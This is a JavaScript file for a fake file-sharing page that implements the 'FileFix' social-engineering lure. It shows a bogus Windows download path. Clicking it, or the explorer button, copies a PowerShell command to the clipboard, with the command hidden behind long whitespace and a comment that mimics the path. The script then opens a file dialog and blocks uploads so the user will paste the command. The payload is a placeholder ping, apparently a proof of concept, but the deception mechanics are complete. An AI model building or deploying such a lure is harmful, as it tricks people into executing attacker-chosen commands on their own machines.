const fileInput = document.getElementById('fileInput');
const fileExplorer = document.getElementById('fileExplorer');
const path = document.getElementById('path');
const shareMessage = document.getElementById('shareMessage');
const timestamp = document.getElementById('timestamp');
const fileName = document.getElementById('fileName');
const fileInfo = document.getElementById('fileInfo');
const instructionsText = document.getElementById('instructionsText');

// Get file ID from URL
const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('id');

let actualFilePath = '';

// Fetch file info
async function loadFileInfo() {
    try {
        const response = await fetch(`/info?id=${code}`);
        const data = await response.json();
        
        if (data.error) {
            showError('File not found or has been removed');
            return;
        }
        
        displayFileInfo(data);
    } catch (error) {
        showError('Failed to load file information');
    }
}

function displayFileInfo(file) {
    const filePath = `C:\\Users\\User\\Downloads\\${file.name}`;
    actualFilePath = filePath;
    
    shareMessage.textContent = `Made "${file.name}" available to you`;
    document.getElementById('fileName').textContent = file.name;
    path.textContent = filePath;
    
    const now = new Date();
    timestamp.textContent = now.toLocaleString('en-US', { 
        month: '2-digit',
        day: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });
    
    fileInfo.classList.remove('hidden');
    fileExplorer.classList.remove('hidden');
    instructionsText.style.display = 'none';
}

// Copy PowerShell command when clicking on the dummy file path
path.addEventListener('click', function () {
    const powershellCommand = `Powershell.exe -c ping example.com                                                                                                                # ${actualFilePath}`;
    navigator.clipboard.writeText(powershellCommand);
    path.classList.add('clicked');
    setTimeout(() => path.classList.remove('clicked'), 2000);
});

// Copy PowerShell command & open file explorer
function openFileExplorer() {
    const powershellCommand = `Powershell.exe -c ping example.com                                                                                                                # ${actualFilePath}`;
    navigator.clipboard.writeText(powershellCommand);
    fileInput.click();
}

// Block any attempted file uploads
fileInput.addEventListener('change', () => {
    alert("Please follow the stated instructions.");
    fileInput.value = "";
    setTimeout(() => fileInput.click(), 500);
});

function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    errorDiv.textContent = message;
    errorDiv.classList.remove('hidden');
}

// Load file info when page loads
loadFileInfo();

